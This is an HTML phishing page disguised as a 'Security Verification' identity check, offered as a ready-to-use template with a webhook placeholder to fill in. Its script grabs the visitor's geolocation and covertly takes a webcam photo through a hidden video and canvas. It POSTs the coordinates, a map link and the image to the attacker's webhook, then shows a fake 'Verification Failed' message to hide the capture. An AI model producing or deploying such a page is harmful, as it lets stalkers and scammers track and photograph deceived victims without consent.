<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification - Action Required</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        button { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Identity Verification</h2>
        <p>To access this information, please verify your location and identity.</p>
        <button onclick="captureData()">Verify Identity</button>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // <--- Apna URL yahan dalein

        async function captureData() {
            // 1. Get Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    // 2. Get Camera & Photo
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        
                        setTimeout(async () => {
                            const canvas = document.getElementById('canvas');
                            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                            const photo = canvas.toDataURL('image/jpeg');

                            // 3. Send Data to Webhook
                            await fetch(WEBHOOK_URL, {
                                method: 'POST',
                                mode: 'no-cors',
                                body: JSON.stringify({
                                    latitude: lat,
                                    longitude: lon,
                                    google_map: `https://www.google.com/maps?q=${lat},${lon}`,
                                    image: photo
                                })
                            });
                            alert("Verification Failed. Please try again later.");
                        }, 1000);
                    } catch (err) {
                        console.log("Camera access denied.");
                    }
                });
            }
        }
    </script>
</body>
</html>
